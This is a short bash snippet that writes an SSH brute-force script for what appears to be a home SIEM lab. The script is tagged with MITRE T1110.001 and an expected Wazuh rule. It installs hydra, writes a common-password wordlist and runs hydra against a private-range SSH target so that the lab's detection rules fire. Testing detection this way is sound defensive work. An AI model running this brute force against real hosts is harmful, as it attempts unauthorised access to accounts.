cat > scripts/attacks/ssh_bruteforce.sh << 'EOF'
#!/bin/bash
# Attack: SSH Brute Force
# MITRE: T1110.001
# Wazuh Rule: 100001
# Run from: Host PC (Ubuntu 24.04)

TARGET_IP="${1:-192.168.8.130}"
TARGET_USER="${2:-ubuntu}"
WORDLIST="${3:-/tmp/test_wordlist.txt}"

echo "[+] Starting SSH brute force from HOST to $TARGET_IP"
echo "[+] MITRE T1110.001 | Expected Wazuh Rule: 100001 (Level 10)"

if ! command -v hydra &> /dev/null; then
    echo "[!] Installing hydra..."
    sudo apt update && sudo apt install -y hydra
fi

# Create test wordlist
echo -e "password123\nadmin\n123456\nroot\nubuntu\nsiem-vm\npassword\n12345" > "$WORDLIST"

echo "[+] Launching hydra..."
hydra -l "$TARGET_USER" -P "$WORDLIST" -t 4 -f ssh://$TARGET_IP 2>/dev/null || true

echo "[+] Done. Check Wazuh dashboard: https://192.168.8.129"
echo "[+] Filter: rule.id:100001"
EOF
chmod +x scripts/attacks/ssh_bruteforce.sh